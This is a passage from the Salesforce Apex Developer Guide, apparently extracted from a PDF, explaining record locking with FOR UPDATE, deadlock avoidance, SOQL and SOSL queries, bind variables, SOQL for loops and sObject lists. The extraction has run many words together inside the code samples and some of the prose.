In Apex, you can use FOR UPDATE to lock sObject records while they’re being updated in order to prevent race conditions and other
thread safety problems.
165
Working with Data in ApexApex Developer Guide

While an sObject record is locked, no other client or user is allowed to make updates either through code or the Salesforce user interface.
The client locking the records can perform logic on the records and make updates with the guarantee that the locked records won’t be
changed by another client during the lock period. The lock gets released when the transaction completes.
To lock a set of sObject records in Apex, embed the keywords FOR UPDATE after any inline SOQL statement. For example, the following
statement, in addition to querying for two accounts, also locks the accounts that are returned:
Account[] accts= [SELECTId FROMAccountLIMIT2 FOR UPDATE];
Note:  You can’t use the ORDERBY keywords in any SOQL query that uses locking.
Locking Considerations
•
While the records are locked by a client, the locking client can modify their field values in the database in the same transaction. Other
clients have to wait until the transaction completes and the records are no longer locked before being able to update the same
records. Other clients can still query the same records while they’re locked.
•
If you attempt to lock a record currently locked by another client, your process waits a maximum of 10 seconds for the lock to be
released before acquiring a new lock. If the wait time exceeds 10 seconds, a QueryException is thrown. Similarly, if you attempt
to update a record currently locked by another client and the lock isn’t released within a maximum of 10 seconds, a DmlException
is thrown.
•
If a client attempts to modify a locked record, the update operation can succeed if the lock gets released within a short amount of
time after the update call was made. In this case, it’s possible that the updates overwrite changes made by the locking client if the
second client obtained an old copy of the record. To prevent the overwrite from happening, the second client must lock the record
first. The locking process returns a fresh copy of the record from the database through the SELECT statement. The second client
can use this copy to make new updates.
•
The record locks that are obtained in Apex via FOR UPDATE clause are automatically released when making callouts. The information
is logged in the debug log and the logged message includes the most recently locked entity type. For example:
FOR_UPDATE_LOCKS_RELEASEFOR UPDATElocksreleaseddue to a callout.The mostrecent
lockwas Account. Use caution while making callouts in contexts where FOR UPDATE queries could have been previously
executed.
•
When you perform a DML operation on one record, related records are locked in addition to the record in question.
Warning:  Use care when setting locks in your Apex code. See Avoiding Deadlocks.
Locking in a SOQL For Loop
The FOR UPDATE keywords can also be used within SOQL for loops. For example:
for (Account[]accts: [SELECTId FROMAccount
FOR UPDATE]){
// Yourcode
}
As discussed in SOQL For Loops, the example above corresponds internally to calls to the query() and queryMore() methods
in the SOAP API.
Note that there is no commit statement. If your Apex trigger completes successfully, any database changes are automatically committed.
If your Apex trigger does not complete successfully, any changes made to the database are rolled back.
166
Working with Data in ApexApex Developer Guide

Avoiding Deadlocks
Apex has the possibility of deadlocks, as does any other procedural logic language involving updates to multiple database tables or
rows. To avoid such deadlocks, the Apex runtime engine:
1.First locks sObject parent records, then children.
2.Locks sObject records in order of ID when multiple records of the same type are being edited.
As a developer, use care when locking rows to ensure that you are not introducing deadlocks. Verify that you are using standard deadlock
avoidance techniques by accessing tables and rows in the same order from all locations in an application.
SOQL and SOSL Queries
You can evaluate Salesforce Object Query Language (SOQL) or Salesforce Object Search Language (SOSL) statements on-the-fly in Apex
by surrounding the statement in square brackets.
SOQL Statements
SOQL statements evaluate to a list of sObjects, a single sObject, or an Integer for count method queries.
For example, you could retrieve a list of accounts that are named Acme:
List<Account>aa = [SELECTId, NameFROMAccountWHEREName= 'Acme'];
From this list, you can access individual elements:
if (!aa.isEmpty()){
// Executecommands
}
You can also create new objects from SOQL queries on existing ones. This example creates a new contact for the first account with the
number of employees greater than 10.
Contactc = new Contact(Account= [SELECTNameFROMAccount
WHERENumberOfEmployees> 10 LIMIT1]);
c.FirstName= 'James';
c.LastName= 'Yoyce';
The newly created object contains null values for its fields, which must be set.
The count method can be used to return the number of rows returned by a query. The following example returns the total number
of contacts with the last name of Weissman:
Integeri = [SELECTCOUNT()FROMContactWHERELastName= 'Weissman'];
You can also operate on the results using standard arithmetic:
Integerj = 5 * [SELECTCOUNT()FROMAccount];
SOQL limits apply when executing SOQL queries. See Execution Governors and Limits.
For a full description of SOQL query syntax, see the Salesforce SOQL and SOSL Reference Guide.
SOSL Statements
SOSL statements evaluate to a list of lists of sObjects, where each list contains the search results for a particular sObject type. The result
lists are always returned in the same order as they were specified in the SOSL query. If a SOSL query doesn’t return any records for a
specified sObject type, the search results include an empty list for that sObject.
167
Working with Data in ApexApex Developer Guide

For example, you can return a list of accounts, contacts, opportunities, and leads that begin with the phrase map:
List<List<SObject>>searchList= [FIND'map*'IN ALL FIELDSRETURNINGAccount(Id,Name),
Contact,Opportunity,Lead];
Note: The syntax of the FIND clause in Apex differs from the syntax of the FIND clause in SOAP API and REST API:
•
In Apex, the value of the FIND clause is demarcated with single quotes. For example:
FIND'map*'IN ALL FIELDSRETURNINGAccount(Id,Name),Contact,Opportunity,Lead
Note:  Apex that is running in system mode ignores field-level security while scanning for a match using IN ALL
FIELDS.
•
In the API, the value of the FIND clause is demarcated with braces. For example:
FIND{map*}IN ALL FIELDSRETURNINGAccount(Id,Name),Contact,Opportunity,Lead
From searchList, you can create arrays for each object returned:
Account[] accounts= ((List<Account>)searchList[0]);
Contact[] contacts= ((List<Contact>)searchList[1]);
Opportunity[] opportunities= ((List<Opportunity>)searchList[2]);
Lead[] leads= ((List<Lead>)searchList[3]);
SOSL limits apply when executing SOSL queries. See Execution Governors and Limits.
Note:  The 4,000 characters limit for WHERE clause strings doesn’t apply to SOQL queries in Apex if the WHERE clause includes
the IN operator.
For a full description of SOSL query syntax, see the Salesforce SOQL and SOSL Reference Guide.
1.Working with SOQL and SOSL Query Results
2.Accessing sObject Fields Through Relationships
3.Understanding Foreign Key and Parent-Child Relationship SOQL Queries
4.Working with SOQL Aggregate Functions
Aggregate functions in SOQL, such as SUM() and MAX(), allow you to roll up and summarize your data in a query.
5.Working with Very Large SOQL Queries
6.Using SOQL Queries That Return One Record
SOQL queries can be used to assign a single sObject value when the result list contains only one element.
7.Improve Performance by Avoiding Null Values
8.Working with Polymorphic Relationships in SOQL Queries
A polymorphic relationship is a relationship between objects where a referenced object can be one of several different types. For
example, the Who relationship field of a Task can be a Contact or a Lead.
9.Using Apex Variables in SOQL and SOSL Queries
10.Querying All Records with a SOQL Statement
168
Working with Data in ApexApex Developer Guide

Working with SOQL and SOSL Query Results
SOQL and SOSL queries only return data for sObject fields that are selected in the original query. If you try to access a field that was not
selected in the SOQL or SOSL query (other than ID), you receive a runtime error, even if the field contains a value in the database. The
following code example causes a runtime error:
insertnew Account(Name= 'Singha');
Accountacc = [SELECTId FROMAccountWHEREName= 'Singha'LIMIT1];
// Notethatnameis not selected
Stringname= [SELECTId FROMAccountWHEREName= 'Singha'LIMIT1].Name;
The following is the same code example rewritten so it does not produce a runtime error. Note that Name has been added as part of
the select statement, after Id.
insertnew Account(Name= 'Singha');
Accountacc = [SELECTId FROMAccountWHEREName= 'Singha'LIMIT1];
// Notethatnameis now selected
Stringname= [SELECTId, NameFROMAccountWHEREName= 'Singha'LIMIT1].Name;
Even if only one sObject field is selected, a SOQL or SOSL query always returns data as complete records. Consequently, you must
dereference the field in order to access it. For example, this code retrieves an sObject list from the database with a SOQL query, accesses
the first account record in the list, and then dereferences the record's AnnualRevenue field:
Doublerev = [SELECTAnnualRevenueFROMAccount
WHEREName= 'Acme'][0].AnnualRevenue;
// Whenonlyone resultis returnedin a SOQLquery,it is not necessary
// to includethe list'sindex.
Doublerev2= [SELECTAnnualRevenueFROMAccount
WHEREName= 'Acme'LIMIT1].AnnualRevenue;
The only situation in which it is not necessary to dereference an sObject field in the result of an SOQL query, is when the query returns
an Integer as the result of a COUNT operation:
Integeri = [SELECTCOUNT()FROMAccount];
Fields in records returned by SOSL queries must always be dereferenced.
Also note that sObject fields that contain formulas return the value of the field at the time the SOQL or SOSL query was issued. Any
changes to other fields that are used within the formula are not reflected in the formula field value until the record has been saved and
re-queried in Apex. Like other read-only sObject fields, the values of the formula fields themselves cannot be changed in Apex.
Accessing sObject Fields Through Relationships
sObject records represent relationships to other records with two fields: an ID and an address that points to a representation of the
associated sObject. For example, the Contact sObject has both an AccountId field of type ID, and an Account field of type Account
that points to the associated sObject record itself.
The ID field can be used to change the account with which the contact is associated, while the sObject reference field can be used to
access data from the account. The reference field is only populated as the result of a SOQL or SOSL query (see note).
For example, the following Apex code shows how an account and a contact can be associated with one another, and then how the
contact can be used to modify a field on the account:
169
Working with Data in ApexApex Developer Guide

Note:  To provide the most complete example, this code uses some elements that are described later in this guide:
•
For information on insert and update, see Insert Statement and Update Statement.
Accounta = new Account(Name= 'Acme');
inserta;  // Insertingthe recordautomaticallyassignsa
// valueto its ID field
Contactc = new Contact(LastName= 'Weissman');
c.AccountId= a.Id;
// The new contactnow pointsat the new account
insertc;
// A SOQLqueryaccessesdatafor the insertedcontact,
// includinga populatedc.accountfield
c = [SELECTAccount.NameFROMContactWHEREId = :c.Id];
// Now fieldsin bothrecordscan be changedthroughthe contact
c.Account.Name= 'salesforce.com';
c.LastName= 'Roth';
// To updatethe database,the two typesof recordsmustbe
// updatedseparately
updatec;// Thisonlychangesthe contact'slastname
updatec.Account;// Thisupdatesthe accountname
Note:  The expression c.Account.Name, and any other expression that traverses a relationship, displays slightly different
characteristics when it is read as a value than when it is modified:
•
When being read as a value, if c.Account is null, then c.Account.Name evaluates to null, but does not yield a
NullPointerException. This design allows developers to navigate multiple relationships without the tedium of having
to check for null values.
•
When being modified, if c.Account is null, then c.Account.Namedoes yield a NullPointerException.
In SOSL, you would access data for the inserted contact in a similar way to the SELECT statement used in the previous SOQL example.
List<List<SObject>>searchList= [FIND'Acme'IN ALL FIELDSRETURNING
Contact(id,Account.Name)]
In addition, the sObject field key can be used with insert, update, or upsert to resolve foreign keys by external ID. For example:
AccountrefAcct= new Account(externalId__c= '12345');
Contactc = new Contact(Account= refAcct,LastName= 'Kay');
insertc;
This inserts a new contact with the AccountId equal to the account with the external_id equal to ‘12345’. If there is no such
account, the insert fails.
Tip: The following code is equivalent to the code above. However, because it uses a SOQL query, it is not as efficient. If this code
was called multiple times, it could reach the execution limit for the maximum number of SOQL queries. For more information on
execution limits, see Execution Governors and Limits on page 346.
AccountrefAcct= [SELECTId FROMAccountWHEREexternalId__c='12345'];
Contactc = new Contact(Account= refAcct.Id);
170
Working with Data in ApexApex Developer Guide

insertc;
Understanding Foreign Key and Parent-Child Relationship SOQL Queries
The SELECT statement of a SOQL query can be any valid SOQL statement, including foreign key and parent-child record joins. If foreign
key joins are included, the resulting sObjects can be referenced using normal field notation. For example:
System.debug([SELECTAccount.NameFROMContact
WHEREFirstName= 'Caroline'].Account.Name);
Additionally, parent-child relationships in sObjects act as SOQL queries as well. For example:
for (Accounta : [SELECTId, Name,(SELECTLastNameFROMContacts)
FROMAccount
WHEREName= 'Acme']) {
Contact[]cons= a.Contacts;
}
//Thefollowingexamplealsoworksbecausewe limitto only1 contact
for (Accounta : [SELECTId, Name,(SELECTLastNameFROMContactsLIMIT1)
FROMAccount
WHEREName= 'testAgg']) {
Contactc = a.Contacts;
}
Working with SOQL Aggregate Functions
Aggregate functions in SOQL, such as SUM() and MAX(), allow you to roll up and summarize your data in a query.
For more information on aggregate functions, see Aggregate Functions in the Salesforce SOQL and SOSL Reference Guide.
You can use aggregate functions without using a GROUPBY clause. For example, you could use the AVG() aggregate function to
find the average Amount for all your opportunities.
AggregateResult[]groupedResults
= [SELECTAVG(Amount)averFROMOpportunity];
ObjectavgAmount= groupedResults[0].get('aver');
Note that any query that includes an aggregate function returns its results in an array of AggregateResult objects. AggregateResult is a
read-only sObject and is only used for query results.
Aggregate functions become a more powerful tool to generate reports when you use them with a GROUPBY clause. For example,
you could find the average Amount for all your opportunities by campaign.
AggregateResult[]groupedResults
= [SELECTCampaignId,AVG(Amount)
FROMOpportunity
GROUPBY CampaignId];
for (AggregateResultar : groupedResults){
System.debug('CampaignID' + ar.get('CampaignId'));
System.debug('Averageamount'+ ar.get('expr0'));
}
171
Working with Data in ApexApex Developer Guide

Any aggregated field in a SELECT list that does not have an alias automatically gets an implied alias with a format expri, where i
denotes the order of the aggregated fields with no explicit aliases. The value of i starts at 0 and increments for every aggregated field
with no explicit alias. For more information, see Using Aliases with GROUPBY in the Salesforce SOQL and SOSL Reference Guide.
Note: Queries that include aggregate functions are still subject to the limit on total number of query rows. All aggregate functions
other than COUNT() or COUNT(fieldname) include each row used by the aggregation as a query row for the purposes
of limit tracking.
For COUNT() or COUNT(fieldname) queries, limits are counted as one query row, unless the query contains a GROUP BY
clause, in which case one query row per grouping is consumed.
For information about the limits that apply to queries with for loop, see SOQL For Loops on page 179.
Working with Very Large SOQL Queries
Important:  Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain
terms to avoid any effect on customer implementations.
Your SOQL query sometimes returns so many sObjects that the limit on heap size is exceeded and an error occurs. To resolve, use a SOQL
query for loop instead, since it can process multiple batches of records by using internal calls to query and queryMore.
For example, if the results are too large, this syntax causes a runtime exception:
Account[]accts= [SELECTId FROMAccount];
Instead, use a SOQL query for loop as in one of the following examples:
// Use thisformatif you are not executingDML statements
// withinthe for loop
for (Accounta : [SELECTId, NameFROMAccount
WHERENameLIKE'Acme%']) {
// YourcodewithoutDML statementshere
}
// Use thisformatfor efficiencyif you are executingDML statements
// withinthe for loop
for (List<Account>accts: [SELECTId, NameFROMAccount
WHERENameLIKE'Acme%']) {
for (Accounta : accts){
// Yourcodehere
}
updateaccts;
}
Note:  Using the SOQL query within the for loop reduces the possibility of reaching the limit on heap size. However, this approach
can result in more CPU cycles being used with increased DML calls. For more information, see SOQL For Loops Versus Standard
SOQL Queries.
The following example demonstrates a SOQL query for loop that’s used to mass update records. Suppose that you want to change
the last name of a contact in records for contacts whose first and last names match specified criteria:
publicvoidmassUpdate(){
for (List<Contact>contacts:
[SELECTFirstName,LastNameFROMContact]){
for(Contactc : contacts){
if (c.FirstName== 'Barbara'&&
172
Working with Data in ApexApex Developer Guide

c.LastName== 'Gordon') {
c.LastName= 'Wayne';
}
}
updatecontacts;
}
}
Instead of using a SOQL query in a for loop, the preferred method of mass updating records is to use batch Apex, which minimizes
the risk of hitting governor limits.
For more information, see SOQL For Loops on page 179.
More Efficient SOQL Queries
For best performance, SOQL queries must be selective, particularly for queries inside triggers.
Selective SOQL Query Criteria
•
A query is selective when one of the query filters is on an indexed field and the query filter reduces the resulting number of rows
below a system-defined threshold. The performance of the SOQL query improves when two or more filters used in the WHERE
clause meet the mentioned conditions.
•
As a best practice, a query is considered selective when a query filter on an indexed field matches less than 10% of the total
rows.
Custom Index Considerations for Selective SOQL Queries
•
The following fields are indexed by default.
–
Primary keys (Id, Name, and OwnerId fields)
–
Foreign keys (lookup or master-detail relationship fields)
–
Audit dates (CreatedDate and SystemModstamp fields)
–
RecordType fields (indexed for all standard objects that feature them)
–
Custom fields that are marked as External ID or Unique
•
Fields not indexed by default are automatically indexed when the Salesforce optimizer recognizes that an index can improve
performance for frequently run queries.
•
Salesforce Support can add custom indexes on request for customers.
•
A custom index can't be created on these types of fields: multi-select picklists, currency fields in a multicurrency organization,
long text fields, some formula fields, and binary fields (fields of type blob, file, or encrypted text.) New data types, typically complex
ones, are periodically added to Salesforce, and fields of these types don’t always allow custom indexing.
•
You can’t create custom indexes on formula fields that include invocations of the TEXT function on picklist fields.
•
Typically, a custom index isn’t used in these cases.
–
The queried values exceed the system-defined threshold.
–
The filter operator is a negative operator such as NOT EQUALTO (or !=), NOT CONTAINS, and NOT STARTS
WITH.
–
The CONTAINS operator is used in the filter, and the number of rows to be scanned exceeds 333,333. The CONTAINS
operator requires a full scan of the index. This threshold is subject to change.
–
You’re comparing with an empty value (Name!= '').
However, there are other complex scenarios in which custom indexes can’t be used. Contact your Salesforce representative if
your scenario isn't covered by these cases or if you need further assistance with non-selective queries.
173
Working with Data in ApexApex Developer Guide

Examples of Selective SOQL Queries
To better understand whether a query on a large object is selective or not, let's analyze some queries. For these queries, assume that
there are more than 1 million records for the Account sObject. These records include soft-deleted records, that is, deleted records
that are still in the Recycle Bin.
Query 1:
SELECTId FROMAccountWHEREId IN (<listof accountIDs>)
The WHERE clause is on an indexed field (Id). If SELECTCOUNT()FROMAccountWHEREId IN (<listof
accountIDs>) returns fewer records than the selectivity threshold, the index on Id is used. This index is typically used when
the list of IDs contains only a few records.
Query 2:
SELECTId FROMAccountWHEREName!= ''
Since Account is a large object even though Name is indexed (primary key), this filter returns most of the records, making the query
non-selective.
Query 3:
SELECTId FROMAccountWHEREName!= '' AND CustomField__c= 'ValueA'
Here we have to see if any filter, when considered individually, is selective. As we saw in the previous example, the first filter isn't
selective. So let's focus on the second one. If the count of records returned by SELECTCOUNT()FROMAccountWHERE
CustomField__c= 'ValueA' is lower than the selectivity threshold, and CustomField__c is indexed, the query is selective.
Using SOQL Queries That Return One Record
SOQL queries can be used to assign a single sObject value when the result list contains only one element.
When the L-value of an expression is a single sObject type, Apex automatically assigns the single sObject record in the query result list
to the L-value. A runtime exception results if zero sObjects or more than one sObject is found in the list. For example:
List<Account>accts= [SELECTId FROMAccount];
// Theselinesof codeare onlyvalidif one row is returnedfrom
// the query.Noticethatthe secondlinedereferencesthe fieldfromthe
// querywithoutassigningit to an intermediarysObjectvariable.
Accountacct= [SELECTId FROMAccount];
Stringname= [SELECTNameFROMAccount].Name;
This usage is supported with the following Apex types, methods, or operators:
•
Database.query method.
•
Safe Navigation Operator. See Safe Navigation Operator.
•
Null Coalescing Operator. See Null Coalescing Operator.
•
Map.values.
Warning:  Although currently supported, Salesforce recommends against using this feature with Map.values.
174
Working with Data in ApexApex Developer Guide

Improve Performance by Avoiding Null Values
In your SOQL and SOSL queries, explicitly filtering out null values in the WHERE clause allows Salesforce to improve query performance.
In the following example, any records where the Thread__c value is null are eliminated from the search.
PublicclassTagWS{
/* getThreadTags
*
* a quickmethodto pulltagsnot in the existinglist
*
*/
publicstaticwebserviceList<String>
getThreadTags(StringthreadId,List<String> tags){
system.debug(LoggingLevel.Debug,tags);
List<String> retVals= new List<String>();
Set<String> tagSet= new Set<String>();
Set<String> origTagSet= new Set<String>();
origTagSet.addAll(tags);
// NoteWHEREclauseoptimizessearchwhereThread__cis not null
for(CSO_CaseThread_Tag__ct :
[SELECTNameFROMCSO_CaseThread_Tag__c
WHEREThread__c= :threadIdAND
Thread__c!= null])
{
tagSet.add(t.Name);
}
for(Stringx : origTagSet){
// returna minusversionof it so the UI knowsto clearit
if(!tagSet.contains(x))retVals.add('-' + x);
}
for(Stringx : tagSet){
// returna plusversionso the UI knowsit'snew
if(!origTagSet.contains(x))retvals.add('+' + x);
}
returnretVals;
}
}
Working with Polymorphic Relationships in SOQL Queries
A polymorphic relationship is a relationship between objects where a referenced object can be one of several different types. For example,
the Who relationship field of a Task can be a Contact or a Lead.
The following describes how to use SOQL queries with polymorphic relationships in Apex. If you want more general information on
polymorphic relationships, see Understanding Relationship Fields and Polymorphic Fields in the SOQL and SOSL Reference.
175
Working with Data in ApexApex Developer Guide

You can use SOQL queries that reference polymorphic fields in Apex to get results that depend on the object type referenced by the
polymorphic field. One approach is to filter your results using the Type qualifier. This example queries Events that are related to an
Account or Opportunity via the What field.
List<Event>events= [SELECTDescriptionFROMEventWHEREWhat.TypeIN ('Account',
'Opportunity')];
Another approach would be to use the TYPEOF clause in the SOQL SELECT statement. This example also queries Events that are
related to an Account or Opportunity via the What field.
List<Event>events= [SELECTTYPEOFWhatWHENAccountTHENPhoneWHENOpportunityTHEN
AmountEND FROMEvent];
These queries return a list of sObjects where the relationship field references the desired object types.
If you need to access the referenced object in a polymorphic relationship, you can use the instanceof keyword to determine the object
type. The following example uses instanceof to determine whether an Account or Opportunity is related to an Event.
EventmyEvent= eventFromQuery;
if (myEvent.WhatinstanceofAccount){
// myEvent.Whatreferencesan Account,so processaccordingly
} elseif (myEvent.WhatinstanceofOpportunity){
// myEvent.Whatreferencesan Opportunity,so processaccordingly
}
Note that you must assign the referenced sObject that the query returns to a variable of the appropriate type before you can pass it to
another method. The following example
1.Queries for User or Group owners of Merchandise__c custom objects using a SOQL query with a TYPEOF clause
2.Uses instanceof to determine the owner type
3.Assigns the owner objects to User or Group type variables before passing them to utility methods
publicclassPolymorphismExampleClass{
// Utilitymethodfor a User
publicstaticvoidprocessUser(UsertheUser){
System.debug('ProcessedUser');
}
// Utilitymethodfor a Group
publicstaticvoidprocessGroup(GrouptheGroup){
System.debug('ProcessedGroup');
}
publicstaticvoidprocessOwnersOfMerchandise(){
// Selectrecordsbasedon the Ownerpolymorphicrelationshipfield
List<Merchandise__c>merchandiseList= [SELECTTYPEOFOwnerWHENUserTHENLastName
WHENGroupTHENEmailEND FROMMerchandise__c];
// We now havea listof Merchandise__crecordsownedby eithera Useror Group
for (Merchandise__cmerch:merchandiseList){
// We can use instanceofto checkthe polymorphicrelationshiptype
// Notethatwe haveto assignthe polymorphicreferenceto the appropriate
// sObjecttypebeforepassingto a method
if (merch.OwnerinstanceofUser){
UseruserOwner= merch.Owner;
processUser(userOwner);
176
Working with Data in ApexApex Developer Guide

} elseif (merch.OwnerinstanceofGroup){
GroupgroupOwner= merch.Owner;
processGroup(groupOwner);
}
}
}
}
Using Apex Variables in SOQL and SOSL Queries
SOQL and SOSL statements in Apex can reference Apex code variables and expressions if they’re preceded by a colon (:). This use of a
local code variable within a SOQL or SOSL statement is called a bind. The Apex parser first evaluates the local variable in code context
before executing the SOQL or SOSL statement. Bind expressions can be used as:
•
The search string in FIND clauses.
•
The filter literals in WHERE clauses.
•
The value of the IN or NOT IN operator in WHERE clauses, allowing filtering on a dynamic set of values. Note that this is of
particular use with a list of IDs or Strings, though it works with lists of any type.
•
The division names in WITHDIVISION clauses.
•
The numeric value in LIMIT clauses.
•
The numeric value in OFFSET clauses.
For example:
AccountA = new Account(Name='xxx');
insertA;
AccountB;
// A simplebind
B = [SELECTId FROMAccountWHEREId = :A.Id];
// A bindwitharithmetic
B = [SELECTId FROMAccount
WHEREName= :('x' + 'xx')];
Strings = 'XXX';
// A bindwithexpressions
B = [SELECTId FROMAccount
WHEREName= :'XXXX'.substring(0,3)];
// A bindwithINCLUDESclause
B = [SELECTId FROMAccountWHERE:A.TYPEINCLUDES(‘Customer– Direct;Customer–
Channel’)];
// A bindwithan expressionthatis itselfa queryresult
B = [SELECTId FROMAccount
WHEREName= :[SELECTNameFROMAccount
WHEREId = :A.Id].Name];
ContactC = new Contact(LastName='xxx', AccountId=A.Id);
insertnew Contact[]{C,new Contact(LastName='yyy',
accountId=A.id)};
177
Working with Data in ApexApex Developer Guide

// Bindsin boththe parentand aggregatequeries
B = [SELECTId, (SELECTId FROMContacts
WHEREId = :C.Id)
FROMAccount
WHEREId = :A.Id];
// One contactreturned
ContactD = B.Contacts;
// A limitbind
Integeri = 1;
B = [SELECTId FROMAccountLIMIT:i];
// An OFFSETbind
IntegeroffsetVal= 10;
List<Account>offsetList= [SELECTId FROMAccountOFFSET:offsetVal];
// An IN-bindwithan Id list.Notethata listof sObjects
// can alsobe used--theIds of the objectsare usedfor
// the bind
Contact[]cc = [SELECTId FROMContactLIMIT2];
Task[]tt = [SELECTId FROMTaskWHEREWhoIdIN :cc];
// An IN-bindwitha Stringlist
String[] ss = new String[]{'a', 'b'};
Account[]aa = [SELECTId FROMAccount
WHEREAccountNumberIN :ss];
// A SOSLquerywithbindsin all possibleclauses
StringmyString1= 'aaa';
StringmyString2= 'bbb';
IntegermyInt3= 11;
StringmyString4= 'ccc';
IntegermyInt5= 22;
List<List<SObject>>searchList= [FIND:myString1IN ALL FIELDS
RETURNING
Account(Id,NameWHERENameLIKE:myString2
LIMIT:myInt3),
Contact,
Opportunity,
Lead
WITHDIVISION=:myString4
LIMIT:myInt5];
Note: Apex bind variables aren’t supported for the units parameter in the DISTANCE function. This query doesn’t work.
Stringunits= 'mi';
List<Account>accountList=
[SELECTID, Name,BillingLatitude,BillingLongitude
178
Working with Data in ApexApex Developer Guide

FROMAccount
WHEREDISTANCE(My_Location_Field__c,GEOLOCATION(10,10),:units)< 10];
Querying All Records with a SOQL Statement
SOQL statements can use the ALL ROWS keywords to query all records in an organization, including deleted records and archived
activities. For example:
System.assertEquals(2,[SELECTCOUNT()FROMContactWHEREAccountId= a.IdALL ROWS]);
You can use ALL ROWS to query records in your organization's Recycle Bin. You cannot use the ALL ROWS keywords with the FOR
UPDATE keywords.
SOQL For Loops
SOQL for loops iterate over all of the sObject records returned by a SOQL query.
The syntax of a SOQL for loop is either:
for (variable: [soql_query]) {
code_block
}
or
for (variable_list: [soql_query]) {
code_block
}
Both variable and variable_list must be of the same type as the sObjects that are returned by the soql_query.
As in standard SOQL queries, the [soql_query] statement can refer to code expressions in their WHERE clauses using the :
syntax. For example:
Strings = 'Acme';
for (Accounta : [SELECTId, NamefromAccount
whereNameLIKE:(s+'%')]) {
// Yourcode
}
The following example combines creating a list from a SOQL query, with the DML update method.
// Createa listof accountrecordsfroma SOQLquery
List<Account>accs= [SELECTId, NameFROMAccountWHEREName= 'Siebel'];
// Loopthroughthe listand updatethe Namefield
for(Accounta : accs){
a.Name= 'Oracle';
}
// Updatethe database
updateaccs;
179
Working with Data in ApexApex Developer Guide

SOQL For Loops Versus Standard SOQL Queries
SOQL for loops differ from standard SOQL statements because of the method they use to retrieve sObjects. While the standard queries
discussed in SOQL and SOSL Queries can retrieve either the count of a query or a number of object records, SOQL for loops retrieve
all sObjects, using efficient chunking with calls to the query and queryMore methods of SOAP API. Developers can avoid the limit
on heap size by using a SOQL for loop to process query results that return multiple records. However, this approach can result in more
CPU cycles being used. See Total heap size.
Queries including an aggregate function don't support queryMore. A run-time exception occurs if you use a query containing an
aggregate function that returns more than 2,000 rows in a for loop.
For fine-grained control over the results of a SOQL query, consider using Apex cursors. See Apex Cursors.
SOQL For Loop Formats
SOQL for loops can process records one at a time using a single sObject variable, or in batches of 200 sObjects at a time using an
sObject list:
•
The single sObject format executes the for loop's <code_block> one time per sObject record. Consequently, it’s easy to
understand and use, but is grossly inefficient if you want to use data manipulation language (DML) statements within the for loop
body. Each DML statement ends up processing only one sObject at a time.
•
The sObject list format executes the for loop's <code_block> one time per list of 200 sObjects. Consequently, it’s a little more
difficult to understand and use, but is the optimal choice if you must use DML statements within the for loop body. Each DML
statement can bulk process a list of sObjects at a time.
For example, the following code illustrates the difference between the two types of SOQL query for loops:
// Createa savepointbecausethe datashouldnot be committedto the database
Savepointsp = Database.setSavepoint();
insertnew Account[]{new Account(Name= 'yyy'),
new Account(Name= 'yyy'),
new Account(Name= 'yyy')};
// The singlesObjectformatexecutesthe for looponceper returnedrecord
Integeri = 0;
for (Accounttmp : [SELECTId FROMAccountWHEREName= 'yyy']) {
i++;
}
System.assert(i== 3); // Sincetherewerethreeaccountsnamed'yyy'in the
// database,the loopexecutedthreetimes
// The sObjectlistformatexecutesthe for looponceper returnedbatch
// of records
i = 0;
Integerj;
for (Account[]tmp : [SELECTId FROMAccountWHEREName= 'yyy']) {
j = tmp.size();
i++;
}
System.assert(j== 3); // The lt shouldhavecontainedthe threeaccounts
// named'yyy'
System.assert(i== 1); // Sincea singlebatchcan holdup to 200 recordsand,
// onlythreerecordsshouldhavebeenreturned,the
// loopshouldhaveexecutedonlyonce
180
Working with Data in ApexApex Developer Guide

// Revertthe databaseto the originalstate
Database.rollback(sp);
Note:
•
The break and continue keywords can be used in both types of inline query for loop formats. When using the sObject
list format, continue skips to the next list of sObjects.
•
DML statements can only process up to 10,000 records at a time, and sObject list for loops process records in batches of
200. Consequently, if you’re inserting, updating, or deleting more than one record per returned record in an sObject list for
loop, it’s possible to encounter runtime limit’s errors. See Execution Governors and Limits.
•
You may get a QueryException in a SOQL for loop with the message Aggregatequeryhas too many
rowsfor directassignment,use FOR loop. This exception is sometimes thrown when accessing a large
set of child records (200 or more) of a retrieved sObject inside the loop, or when getting the size of such a record set. For
example, the query in the following SOQL for loop retrieves child contacts for a particular account. If this account contains
more than 200 child contacts, the statements in the for loop cause an exception.
for (Accountacct: [SELECTId, Name,(SELECTId, NameFROMContacts)
FROMAccountWHEREId IN ('<IDvalue>')]) {
List<Contact>contactList= acct.Contacts;// Causesan error
Integercount= acct.Contacts.size();// Causesan error
// Note:If JSON.serialize()is usedhereon acct,the resultingJSONwon'thave
the completeset of Contacts
}
To avoid getting this exception, use a for loop to iterate over the child records, as follows.
for (Accountacct: [SELECTId, Name,(SELECTId, NameFROMContacts)
FROMAccountWHEREId IN ('<IDvalue>')]) {
Integercount=0;
for (Contactc : acct.Contacts){
count++;
}
}
In this example, if JSON.serialize() is used on acct, only the records that have been retrieved so far will be returned
and serialized. Because the Apex SOQL for-loop mechanism is designed to minimize the amount of heap usage by keeping
only a subset of the record data in memory, the complete sObject and any subquery sObjects will not be available to obtain
complete serialization.
sObject Collections
You can manage sObjects in lists, sets, and maps.
Lists of sObjects
Lists can contain sObjects among other types of elements. Lists of sObjects can be used for bulk processing of data.
Sorting Lists of sObjects
Using the List.sort method, you can sort lists of sObjects.
Expanding sObject and List Expressions
181
Working with Data in ApexApex Developer Guide

Sets of Objects
Sets can contain sObjects among other types of elements.
Maps of sObjects
Map keys and values can be of any data type, including sObject types, such as Account.
Lists of sObjects
Lists can contain sObjects among other types of elements. Lists of sObjects can be used for bulk processing of data.
You can use a list to store sObjects. Lists are useful when working with SOQL queries. SOQL queries return sObject data and this data
can be stored in a list of sObjects. Also, you can use lists to perform bulk operations, such as inserting a list of sObjects with one call.
To declare a list of sObjects, use the List keyword followed by the sObject type within <> characters. For example:
// Createan emptylistof Accounts
List<Account>myList= new List<Account>();
Auto-populating a List from a SOQL Query
You can assign a List variable directly to the results of a SOQL query. The SOQL query returns a new list populated with the records
returned. Make sure that the declared List variable contains the same sObject that is being queried. Or you can use the generic sObject
data type.
This example shows how to declare and assign a list of accounts to the return value of a SOQL query. The query returns up to 1,000
returns account records containing the Id and Name fields.
// Createa listof accountrecordsfroma SOQLquery
List<Account>accts= [SELECTId, NameFROMAccountLIMIT1000];
Adding and Retrieving List Elements
As with lists of primitive data types, you can access and set elements of sObject lists using the List methods provided by Apex. For
example:
